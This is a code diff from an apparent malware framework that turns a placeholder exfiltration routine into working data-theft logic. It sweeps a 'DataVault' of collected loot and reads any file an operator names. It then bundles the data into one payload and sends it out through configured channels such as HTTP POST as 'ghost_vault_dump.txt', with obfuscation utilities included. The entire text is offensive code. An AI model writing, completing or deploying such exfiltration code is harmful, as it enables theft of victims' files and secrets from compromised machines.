@@ -1,5 +1,9 @@
 #include "modules/Exfiltration.hpp"
+#include "utils/FileUtils.hpp"
+#include "utils/SystemUtils.hpp"
+#include "utils/Obfuscation.hpp"
 #include "utils/Logger.hpp"
+#include "utils/DataVault.hpp"
 
 #ifdef EXFIL_HTTP
     #include "modules/exfiltration/HttpPost.hpp"
@@ -19,16 +23,29 @@ bool Exfiltration::execute(const std::string& args) {
         return false;
     }
 
-    // dummy for now, think about what should be here instead
-    std::string targetFile = args.empty() ? ".test" : args;
-    std::string data = "some secret data";
+    auto loot = DataVault::Sweep();
+
+    if (!args.empty()) {
+        LOG_INFO("Manual exfiltration requested for {}", args)
+        loot["MANUAL"] = FileUtils::ReadFile(args);
+    }
+
+    if (loot.empty()) {
+        LOG_ERROR("Vault is empty, no data to exfiltrate")
+        return false;
+    }
+
+    std::string aggregatedPayload;
+    for (const auto& [category, data] : loot) {
+        aggregatedPayload += "\n[" + category + "]\n" + data;
+    }
 
     int successCount = 0;
     for (auto& method : methods) {
-        if (method->canHandle(data.size())) {
+        if (method->canHandle(aggregatedPayload.size())) {
             LOG_INFO("Exfiltrating data via {}", method->getName())
 
-            if (method->send(targetFile, data)) {
+            if (method->send("ghost_vault_dump.txt", aggregatedPayload)) {
                 LOG_SUCCESS("Successfully exfiltrated data via {}", method->getName())
                 successCount++;
             } else {
@@ -37,7 +54,7 @@ bool Exfiltration::execute(const std::string& args) {
         }
     }
 
-    return successCount;
+    return successCount > 0;
 }
 
 // can't really restore exfiltration, so just an empty function for now
